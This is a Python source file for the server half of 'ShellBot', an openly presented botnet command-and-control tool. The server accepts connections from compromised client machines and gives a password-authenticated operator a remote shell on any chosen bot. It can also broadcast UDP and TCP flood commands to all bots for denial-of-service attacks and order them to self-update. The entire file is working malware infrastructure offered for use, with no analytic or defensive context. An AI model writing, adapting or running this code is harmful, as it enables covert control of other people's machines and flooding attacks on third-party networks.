#!/usr/bin/env python3

## MIT License
##
## Copyright (c) 2017 Sayak Brahmachari
##
## Permission is hereby granted, free of charge, to any person obtaining a copy
## of this software and associated documentation files (the "Software"), to
## deal in the Software without restriction, including without limitation the
## rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
## sell copies of the Software, and to permit persons to whom the Software is
## furnished to do so, subject to the following conditions:
##
## The above copyright notice and this permission notice shall be included in
## all copies or substantial portions of the Software.
##
## THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
## IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
## FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
## AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
## LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
## FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
## IN THE SOFTWARE.

import os, sys, time
from socket import *

if (len(sys.argv) == 4):
  port = int(sys.argv[1])
  bridgeport = int(sys.argv[2])
  password = sys.argv[3]
else:
  sys.exit("Usage: server.py <port> <bridge port> <password>")

intro = """
 ____ ____ ____ ____ ____ ____ ____ ____
||S |||h |||e |||l |||l |||B |||o |||t ||
||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|

Coded by: Sayak Brahmachari
GitHub: https://github.com/sayak-brm
Website: http://mctrl.ml
"""

cli_err = "[SERVER - ERROR] Client closed the connection"
cli_err += "\n[INFO] Retreiving connections again...\n"

s=socket(AF_INET, SOCK_STREAM)
s.settimeout(5) #5 seconds are given for every operation by socket `s`
s.bind(("0.0.0.0",port))
s.listen(5)

bridge=socket(AF_INET, SOCK_STREAM)
bridge.bind(("0.0.0.0",bridgeport))
bridge.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

allConnections = []
allAddresses = []

#Close all Connections-->
def quitClients():
  for item in allConnections:
    try:
      item.send(bytes("exit", 'utf-8'))
      item.close()
    except: #Connection already closed
      pass

  del allConnections[:]
  del allAddresses[:] 
#<--

#Get Client Connections-->
def getConnections():
  quitClients()

  while 1:
    try:
      q,addr=s.accept()
      q.setblocking(1) #No Timeout
      allConnections.append(q)
      allAddresses.append(addr)
    except: #Time's up
      break
#<--

#Proper Sending to Controller-->
def sendController(msg, q):
  try:
    q.send(bytes(msg, 'utf-8'))
    return 1 #success
  except Exception as ex: print('[SERVER] Error:', ex); return 0 #fail
  
#<--

def main():
  while 1:
    bridge.listen(0)
    q,addr=bridge.accept()

    cpass = q.recv(20480).decode()
    
    if (cpass == password): loginsucc=True
    else: loginsucc=False

    timeout = time.time() + 500 

    breakit = False
    while 1:
      if (loginsucc == False): break #Wrong Pass

      if ((time.time() > timeout) or (breakit == True)): break #5 min.s passed

      try: command = q.recv(20480).decode()
      except Exception as ex: print('[SERVER] Error:', ex); break

      if (command == "accept"):
        getConnections()
        if (sendController("[SERVER] Done Accepting\n", q) == 0): break

      elif(command == "list"):
        temporary = ""
        for item in allAddresses: temporary += "%d - %s|%s\n" % (
          allAddresses.index(item) + 1, str(item[0]), str(item[1]))
        if (temporary != ""):
          if (sendController(temporary, q) == 0): break
        else:
          if (sendController("[SERVER] No clients\n", q) == 0): break

      elif("interact " in command):
        chosenone = int(command.replace("interact ","")) - 1
        if ((chosenone < len(allAddresses)) and (chosenone >= 0 )):
          if (sendController("[SERVER] Interacting with %s\n" % str(
            allAddresses[chosenone]), q) == 0): break

          try:
            allConnections[chosenone].send(bytes("hellows123", 'utf-8'))
            vtpath = allConnections[chosenone].recv(20480).decode() + "> "

            if (sendController(vtpath, q) == 0): break

            while 1:
              if (time.time() > timeout): #5 minutes passed
                breakit = True
                break

              try: data=q.recv(20480).decode() #Recieves command
              except Exception as ex:
                print('[SERVER] Error:', ex)
                breakit = True
                break
              
              try: #Pass it out to Client and Send back the Response
                if ("cd " in data):
                  allConnections[chosenone].send(bytes(data, 'utf-8'))
                  msg=allConnections[chosenone].recv(20480).decode()
                  vtpath = msg + "> "
                  if (sendController(vtpath, q) == 0):
                    breakit = True
                    break
                elif (data == "stop"): break
                else:
                  allConnections[chosenone].send(bytes(data, 'utf-8'))
                  msg=allConnections[chosenone].recv(20480).decode()
                  if (sendController(msg, q) == 0):
                    breakit = True
                    break
              except:
                if (sendController(cli_err, q) == 0):
                  breakit = True
                  break
                break
          except:
            if (sendController(cli_err, q) == 0):break
            getConnections()
        else:
          if (sendController("[SERVER - ERROR] Client doesn't exist\n",
                             q) == 0): break

      elif ("udpfloodall " in command or "tcpfloodall " in command):
        for item in allConnections:
          try:
            item.send(bytes(command, 'utf-8'))
          except:
            pass
      elif (command == "selfupdateall"):
        for item in allConnections:
          try:
            item.send(bytes(command, 'utf-8'))
          except:
            pass

      elif(command == "quit"):
        quitClients()
        q.close()
        break
      else:
        if (sendController("[SERVER - ERROR] Invalid Command\n",
                           q) == 0): break

while 1:
  try:
    main()
  except KeyboardInterrupt:
    quitClients()
  except Exception as ex:
    print('[SERVER] Error:', ex)
    quitClients()

  time.sleep(5) #Wait 5 Seconds before we start again
